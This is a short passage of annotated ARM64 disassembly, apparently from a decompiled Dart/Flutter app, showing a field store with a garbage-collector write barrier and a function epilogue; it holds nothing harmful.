    // 0x9eea08: ldur            x1, [fp, #-8]
    // 0x9eea0c: StoreField: r1->field_3b = r0
    //     0x9eea0c: stur            w0, [x1, #0x3b]
    //     0x9eea10: ldurb           w16, [x1, #-1]
    //     0x9eea14: ldurb           w17, [x0, #-1]
    //     0x9eea18: and             x16, x17, x16, lsr #2
    //     0x9eea1c: tst             x16, HEAP, lsr #32
    //     0x9eea20: b.eq            #0x9eea28
    //     0x9eea24: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x9eea28: r0 = Null
    //     0x9eea28: mov             x0, NULL
    // 0x9eea2c: LeaveFrame
    //     0x9eea2c: mov             SP, fp
    //     0x9eea30: ldp             fp, lr, [SP], #0x10
    // 0x9eea34: ret
    //     0x9eea34: ret             
  }
}
